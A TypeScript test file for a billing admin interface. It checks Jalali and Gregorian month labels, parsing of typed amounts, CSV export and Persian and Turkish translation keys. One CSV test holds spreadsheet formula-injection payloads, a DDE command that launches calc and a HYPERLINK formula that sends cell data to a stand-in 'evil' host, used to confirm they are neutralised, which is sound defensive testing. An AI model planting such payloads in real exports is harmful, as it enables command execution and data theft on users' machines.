  }) as Parameters<typeof ui.monthLabel>[3];

  it('short chart labels carry the year in both calendars (a 24-month chart has each month twice)', () => {
    expect(ui.shortMonthLabel('1404-07', 'jalali', 'en', t)).toBe('Mehr 04');
    expect(ui.shortMonthLabel('1405-07', 'jalali', 'en', t)).toBe('Mehr 05');
    expect(ui.shortMonthLabel('1405-07', 'jalali', 'fa', t)).toBe('Mehr ۰۵');
    expect(ui.shortMonthLabel('2026-10', 'gregorian', 'en', t)).toBe('Oct 26');
  });

  it('names months in both calendars', () => {
    expect(ui.monthLabel('1405-07', 'jalali', 'en', t)).toBe('Mehr 1405');
    expect(ui.monthLabel('1405-01', 'jalali', 'en', t)).toBe('Farvardin 1405');
    expect(ui.monthLabel('2026-10', 'gregorian', 'en', t)).toBe('October 2026');
  });

  it('reads typed amounts as minor units and checks them', () => {
    expect(ui.amountToMinor('12.5', 'USD')).toBe(1250);
    expect(ui.amountToMinor('۱٬۵۰۰', 'IRR')).toBe(15_000);
    expect(ui.amountToMinor('0', 'USD')).toBeNull();
    expect(ui.amountToMinor('abc', 'USD')).toBeNull();
    expect(ui.adjustProblem('debit', 3000, 2500, 'USD')).toBe('overBalance');
    expect(ui.adjustProblem('debit', 2500, 2500, 'USD')).toBeNull();
    expect(ui.adjustProblem('credit', 5_000_001, 0, 'USD')).toBe('tooLarge');
    expect(ui.adjustProblem('credit', null, 0, 'USD')).toBe('invalid');
  });

  it('writes CSV safely', () => {
    expect(ui.toCsv([['a,b', 'say "hi"', '=SUM(A1)', -5, null]])).toBe('"a,b","say ""hi""",\'=SUM(A1),-5,');
    const rows = ui.revenueCsvRows(report('iran', ['IRR'], [
      { day: '2026-10-01', metric: 'payment', currency: 'IRR', provider: 'zarinpal', source: 'checkout', purpose: 'topup', count: 1, gross_minor: 1_090_000, tax_minor: 90_000, net_minor: 1_000_000 },
    ]));
    expect(rows[0][0]).toBe('month');
    expect(rows.at(-1)).toEqual(['1405-07', 'IRR', 'Toman', 1, 109_000, 9_000, 100_000, 0, 0, 0, 0, 100_000]);
    // Notes follow the data after an empty row.
    const noted = ui.revenueCsvRows(report('iran', ['IRR']), ['Purged workspaces are not included.']);
    expect(noted.slice(-2)).toEqual([[], ['# Purged workspaces are not included.']]);
  });

  it('neutralises text cells that start with "-" and a digit (a formula to a spreadsheet); numbers stay numbers', () => {
    expect(ui.toCsv([["-1+cmd|' /C calc'!A0", '-2+HYPERLINK("https://evil/?"&B2,"x")', -5, '-3']]))
      .toBe(`'-1+cmd|' /C calc'!A0,"'-2+HYPERLINK(""https://evil/?""&B2,""x"")",-5,'-3`);
  });

  it('marks period ends within a week', () => {
    const now = Date.parse('2026-10-11T00:00:00Z');
    expect(ui.periodEndSoon('2026-10-15T00:00:00Z', now)).toBe(true);
    expect(ui.periodEndSoon('2026-10-30T00:00:00Z', now)).toBe(false);
    expect(ui.periodEndSoon(null, now)).toBe(false);
  });
});

// ─── Translations ──────────────────────────────────────────────────────────

function leaves(obj: unknown, prefix = ''): string[] {
  if (obj === null || typeof obj !== 'object') return [prefix];
  return Object.entries(obj as Record<string, unknown>).flatMap(([k, v]) => leaves(v, prefix ? `${prefix}.${k}` : k));
}

function valueAt(obj: unknown, path: string): unknown {
  return path.split('.').reduce<unknown>((n, p) => (n && typeof n === 'object' ? (n as Record<string, unknown>)[p] : undefined), obj);
}

describe('phase 6 translations (admin.simpleBilling)', () => {
  const base = leaves(en.admin.simpleBilling).sort();

  /** Every key the design (§4.3) names, parts C and D. */
  const DESIGN_KEYS = [
    'tabs.revenue', 'tabs.accounts',
    'accounts.title', 'accounts.search',
    ...['with_account', 'all', 'positive_balance', 'auto_renew', 'card', 'prepaid', 'due_7d'].map((k) => `accounts.filter.${k}`),
    ...['balance_desc', 'period_end_asc', 'last_payment_desc', 'created_desc', 'name_asc'].map((k) => `accounts.sort.${k}`),
    ...['workspace', 'owner', 'plan', 'status', 'periodEnd', 'balance', 'autoRenew', 'card', 'lastPayment'].map((k) => `accounts.col.${k}`),
    'accounts.noAccount', 'accounts.prepaid', 'accounts.empty', 'accounts.csv',
    'accounts.liability.balance', 'accounts.liability.prepaid', 'accounts.liability.accounts',
    'detail.balance', 'detail.plan', 'detail.card', 'detail.profile',
    'detail.scheduled', 'detail.prepaidNext', 'detail.dueUnprocessed', 'detail.openAssign',
    'detail.tabs.ledger', 'detail.tabs.payments',
    ...['date', 'kind', 'amount', 'balanceAfter', 'reason', 'actor', 'provider', 'source', 'purpose', 'result', 'status', 'gross', 'net', 'tax', 'refunded'].map((k) => `detail.col.${k}`),
    'detail.review', 'detail.refunds', 'detail.refundedAt', 'detail.receipt', 'detail.print', 'detail.notFound',
    ...['credit', 'debit', 'amount', 'category', 'reason', 'reasonHint', 'after', 'confirmTitle', 'confirmCredit', 'confirmDebit', 'cardHint'].map((k) => `adjust.${k}`),
    ...['goodwill', 'compensation', 'correction', 'migration', 'test', 'other'].map((k) => `adjust.categories.${k}`),
    ...['BALANCE_CHANGED', 'CURRENCY_CHANGED', 'INSUFFICIENT_BALANCE', 'ADJUST_TOO_LARGE', 'KEY_REUSED', 'TOO_MANY_ADJUSTMENTS'].map((k) => `adjust.errors.${k}`),
    'adjust.done',
    ...['title', 'months', 'includeTest', 'gross', 'tax', 'refunds', 'netAfterRefunds', 'payments', 'byPurpose', 'byProvider', 'bySource', 'movements', 'notRevenue', 'liability', 'lastMonth', 'ytd'].map((k) => `revenue.${k}`),
    'revenue.footnote.paddle', 'revenue.footnote.chargeback', 'revenue.footnote.refundMonth', 'revenue.empty',
    ...['topup', 'renewal', 'upgrade', 'ai_pack', 'plan'].map((k) => `revenue.purpose.${k}`),
    ...['checkout', 'card_setup', 'card_renewal', 'card_charge'].map((k) => `revenue.source.${k}`),
    'gateways.readinessTitle', 'gateways.listed', 'gateways.notListed',
    ...['not_in_edition', 'inactive', 'currency', 'cannot_confirm', 'test', 'not_configured'].map((k) => `gateways.reason.${k}`),
    'gateways.cardAutoRenew', 'gateways.fix',
    ...['retentionDays', 'retentionHint', 'aiAllowance', 'aiAllowanceHint', 'vatFromSettings', 'editVat'].map((k) => `plans.${k}`),
    ...['title', 'credit', 'price', 'active', 'add', 'remove', 'invalid'].map((k) => `aiPacks.${k}`),
    'userCard.title', 'userCard.empty', 'workspaceCard.title', 'workspaceCard.open',
  ];

  it('has every key the design names', () => {
    expect(DESIGN_KEYS.filter((k) => !base.includes(k))).toEqual([]);
  });

  for (const [name, locale] of [['fa', fa], ['tr', tr]] as const) {
    it(`${name} has the same keys as en, none empty`, () => {
      const keys = leaves(locale.admin.simpleBilling).sort();
      expect(keys.filter((k) => !base.includes(k))).toEqual([]);
      expect(base.filter((k) => !keys.includes(k))).toEqual([]);
      expect(base.filter((k) => String(valueAt(locale.admin.simpleBilling, k) ?? '').trim() === '')).toEqual([]);
    });

    it(`${name} keeps every {{placeholder}} of en`, () => {
      const vars = (s: unknown) => (String(s).match(/\{\{\w+\}\}/g) ?? []).sort();
      const wrong = base.filter((k) => JSON.stringify(vars(valueAt(en.admin.simpleBilling, k))) !== JSON.stringify(vars(valueAt(locale.admin.simpleBilling, k))));
      expect(wrong).toEqual([]);
    });
  }

  it('writes Persian with Persian letters, not Arabic ي and ك', () => {
    const text = JSON.stringify(fa.admin.simpleBilling);
    expect(text).not.toMatch(/[يك]/);
  });

  it('Turkish is written out, not copied from English', () => {
    const same = base.filter((k) => {
      const e = String(valueAt(en.admin.simpleBilling, k));
      return /[a-z]{4}/i.test(e) && e === String(valueAt(tr.admin.simpleBilling, k));
    });
    // Words that are the same in Turkish (Plan, Test) and Jalali month names.
    const SAME_IN_TURKISH = new Set([
      'common.test', 'adjust.categories.test', 'accounts.col.plan', 'detail.plan', 'adjust.counter',
      'jalaliMonths.4', 'jalaliMonths.5', 'jalaliMonths.7', 'jalaliMonths.8', 'jalaliMonths.10',
    ]);
    expect(same.filter((k) => !SAME_IN_TURKISH.has(k))).toEqual([]);
  });
});
